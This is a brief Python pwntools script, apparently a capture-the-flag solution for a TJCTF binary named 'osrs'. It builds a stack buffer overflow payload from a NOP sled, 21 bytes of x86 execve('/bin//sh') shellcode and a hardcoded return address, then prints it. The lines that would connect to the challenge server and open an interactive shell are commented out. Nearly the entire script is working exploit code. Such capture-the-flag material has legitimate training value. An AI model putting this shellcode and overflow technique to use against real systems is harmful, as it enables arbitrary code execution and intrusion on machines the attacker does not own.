from pwn import *

sc = '\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' #21 bytes
addr = '\xe4\xcf\xff\xff'
payload = '\x90'*251+sc+addr
#p = remote('p1.tjctf.org',8006)
#p = process('./osrs')
#print p.recvuntil(':')
#p.sendline(payload)
#p.recvline()
#print p.recv()
#p.interactive()
print payload
